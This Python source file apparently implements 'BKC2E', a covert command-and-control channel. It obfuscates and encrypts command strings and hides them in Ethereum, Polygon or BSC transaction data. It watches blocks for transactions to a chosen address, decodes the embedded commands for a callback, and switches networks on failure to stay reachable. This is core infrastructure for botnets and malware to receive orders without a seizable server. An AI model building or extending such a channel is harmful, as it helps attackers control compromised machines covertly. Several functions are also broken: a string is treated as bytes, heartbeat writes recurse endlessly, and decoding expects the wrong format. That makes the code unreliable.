import time
import json
import hashlib
import base64
import random
import os
import threading
from web3 import Web3
from cryptography.fernet import Fernet
import requests

class BKC2E:
    def __init__(self, net="eth", hb=True):
        self.net = net
        self.hb = hb
        self._s = bytearray(random.getrandbits(8) for _ in range(32))
        self._k = Fernet.generate_key()
        self._f = Fernet(self._k)
        self.l = []
        self._running = True
        self._setup_web3()

    def _setup_web3(self):
        if self.net == "eth":
            infura = os.environ.get("INFURA_URL", "https://mainnet.infura.io/v3/YOUR_KEY")
            self.w3 = Web3(Web3.HTTPProvider(infura))
        elif self.net == "poly":
            poly_rpc = os.environ.get("POLYGON_RPC", "https://polygon-rpc.com")
            self.w3 = Web3(Web3.HTTPProvider(poly_rpc))
        elif self.net == "bsc":
            bsc_rpc = os.environ.get("BSC_RPC", "https://bsc-dataseed.binance.org")
            self.w3 = Web3(Web3.HTTPProvider(bsc_rpc))
        else:
            self.w3 = None

    def _h(self, d):
        return hashlib.sha256(str(d).encode() + self._s).hexdigest()

    def _b(self, d):
        return base64.b64encode(d).decode()

    def _ub(self, s):
        return base64.b64decode(s)

    def _x(self, b):
        return bytes([a ^ b for a, b in zip(b, self._s * (len(b)//32+1))])

    def _mk(self):
        return bytearray(random.getrandbits(8) for _ in range(32))

    def _enc(self, d):
        k = self._mk()
        x = self._x(d)
        e = self._f.encrypt(x)
        return self._b(e + k)

    def _dec(self, s):
        d = self._ub(s)
        e = d[:-32]
        k = d[-32:]
        x = self._f.decrypt(e)
        return self._x(x)

    def _switch_net(self, new_net):
        self.net = new_net
        self._setup_web3()
        print(f"BKC2E: switched to {new_net}")

    def w_eth(self, cmd):
        if not self.w3: return None
        data = cmd.encode()
        enc = self._enc(data)
        if len(enc) > 80:
            enc = enc[:80]
        return "0x" + enc.hex()

    def w_poly(self, cmd):
        return self.w_eth(cmd)

    def w_bsc(self, cmd):
        return self.w_eth(cmd)

    def w_sol(self, cmd):
        # dummy for solana – would use solana-py in real impl
        data = cmd.encode()
        enc = self._enc(data)
        return base64.b64encode(enc).decode()

    def write(self, cmd):
        if self.hb:
            return self._hb_write(cmd)
        if self.net == "eth":
            return self.w_eth(cmd)
        elif self.net == "poly":
            return self.w_poly(cmd)
        elif self.net == "bsc":
            return self.w_bsc(cmd)
        else:
            return None

    def _hb_write(self, cmd):
        # heartbeat: just signal that we're alive, store full cmd locally
        # could store in a local queue and later send full if needed
        self.l.append({"cmd": cmd, "ts": time.time()})
        return self.write("PING")

    def r_eth(self, tx_hash):
        if not self.w3: return None
        tx = self.w3.eth.get_transaction(tx_hash)
        inp = tx.input
        if inp and inp != "0x":
            raw = bytes.fromhex(inp[2:])
            try:
                dec = self._dec(raw)
                return dec.decode()
            except:
                return None
        return None

    def r_poly(self, tx_hash):
        return self.r_eth(tx_hash)

    def r_bsc(self, tx_hash):
        return self.r_eth(tx_hash)

    def r_sol(self, tx_sig):
        return None

    def read(self, tx_id):
        if self.net == "eth":
            return self.r_eth(tx_id)
        elif self.net == "poly":
            return self.r_poly(tx_id)
        elif self.net == "bsc":
            return self.r_bsc(tx_id)
        else:
            return None

    def scan(self, addr, last=10):
        if self.net in ["eth","poly","bsc"]:
            latest = self.w3.eth.block_number
            events = []
            for b in range(latest-last, latest+1):
                block = self.w3.eth.get_block(b, full_transactions=True)
                for tx in block.transactions:
                    if tx.to and tx.to.lower() == addr.lower():
                        res = self.read(tx.hash.hex())
                        if res:
                            events.append({"tx": tx.hash.hex(), "data": res})
            return events
        return []

    def monitor(self, addr, interval=60, callback=None):
        def _m():
            while self._running:
                try:
                    if self.net in ["eth","poly","bsc"]:
                        b = self.w3.eth.block_number
                        if len(self.l) == 0:
                            self.l.append(b)
                        else:
                            last = self.l[-1]
                            for nb in range(last+1, b+1):
                                block = self.w3.eth.get_block(nb, full_transactions=True)
                                for tx in block.transactions:
                                    if tx.to and tx.to.lower() == addr.lower():
                                        res = self.read(tx.hash.hex())
                                        if res and callback:
                                            callback(res)
                            self.l.append(b)
                except Exception as e:
                    print(f"BKC2E monitor err: {e}")
                    nets = ["eth", "poly", "bsc"]
                    if self.net in nets:
                        current = nets.index(self.net)
                        next_net = nets[(current+1) % len(nets)]
                        self._switch_net(next_net)
                time.sleep(interval)
        t = threading.Thread(target=_m, daemon=True)
        t.start()
        return t

    def stop(self):
        self._running = False

    def _fake(self):
        return self._h(str(time.time()))

if __name__ == "__main__":
    b = BKC2E(net="eth")
    enc = b.write("test heartbeat")
    print("heartbeat:", enc)
    # b.monitor("0x...", callback=lambda x:print("rcv:",x))
    # time.sleep(300)